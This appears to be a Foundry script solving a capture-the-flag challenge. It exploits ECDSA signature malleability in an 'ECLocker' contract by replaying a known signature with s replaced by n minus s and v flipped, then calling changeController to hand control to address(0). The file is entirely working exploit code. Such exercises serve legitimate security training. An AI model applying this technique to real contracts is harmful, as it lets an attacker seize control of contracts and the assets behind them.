// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IECLocker{
    function open(uint8 v, bytes32 r, bytes32 s) external;
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}


contract ImporsonatorScript is Script{
    function run() public{
        address ins = 0x0C3126619A5d3072eB889ad0eC8b612Db0E3e5ED;
        IECLocker ECLocker = IECLocker(ins);

        bytes32 r = 0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91;
        bytes32 s = 0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2;
        uint8 v = 0x1B; 


        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

        bytes32 s_new = bytes32(n - uint256(s));

        uint8 v_new = (v == 27) ? 28 : 27;

        vm.startBroadcast();

            ECLocker.changeController(v_new, r, s_new, address(0));

        vm.stopBroadcast();

    }
}